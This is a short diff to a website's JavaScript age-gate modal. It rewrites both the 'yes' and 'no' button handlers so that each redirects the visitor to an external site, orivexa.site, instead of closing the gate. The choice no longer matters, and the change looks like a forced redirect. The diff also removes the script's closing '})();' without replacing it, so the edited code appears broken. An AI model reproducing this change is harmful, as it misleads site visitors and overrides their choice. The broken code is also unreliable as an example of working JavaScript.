@@ -93,6 +93,9 @@ if(form){
     document.body.classList.remove('modal-open');
     bd.style.display='none'; bd.remove();
   }
-  bd.querySelector('#age-yes').addEventListener('click', closeGate);
-   bd.querySelector('#age-no').addEventListener('click', closeGate);  
-})();
+  bd.querySelector('#age-yes').addEventListener('click',  function(){
+   window.location.href = "https://orivexa.site/"; // change to your target page
+  });
+   bd.querySelector('#age-no').addEventListener('click',  function(){
+   window.location.href = "https://orivexa.site/"; // change to your target page
+  });
